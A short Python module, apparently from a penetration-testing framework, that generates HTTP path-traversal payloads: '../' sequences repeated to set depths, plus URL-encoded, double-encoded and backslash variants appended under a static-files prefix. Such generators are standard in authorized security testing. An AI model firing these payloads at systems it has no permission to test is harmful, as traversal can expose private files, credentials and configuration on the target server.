#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Generic HTTP path-traversal payload builders."""

from __future__ import annotations

from typing import List

from core.framework.base_module import BaseModule


class Path_traversal(BaseModule):
    """Reusable ../ and encoded traversal candidates for query/path parameters."""

    @staticmethod
    def dotdot_payloads(target_path: str, max_depth: int = 6) -> List[str]:
        path = str(target_path or "").strip()
        if not path:
            return []
        payloads = [path]
        rel = path.lstrip("/")
        depth = max(1, int(max_depth or 6))
        for n in range(1, depth + 1):
            payloads.append(("../" * n) + rel)
        encoded_single = "%2e%2e%2f"
        payloads.append((encoded_single * 4) + rel)
        return payloads

    @staticmethod
    def static_traversal_paths(
        relative: str,
        depth: int = 8,
        prefix: str = "/static/",
    ) -> List[str]:
        rel = str(relative or "").lstrip("/")
        if not rel:
            return []
        if not prefix.endswith("/"):
            prefix += "/"
        seqs = ("../", "..%2f", "..%252f", "%2e%2e%2f", "..\\")
        payloads: List[str] = []
        dmax = max(1, int(depth or 8))
        for d in range(1, dmax + 1):
            for seq in seqs:
                payloads.append(f"{prefix}{seq * d}{rel}")
        return payloads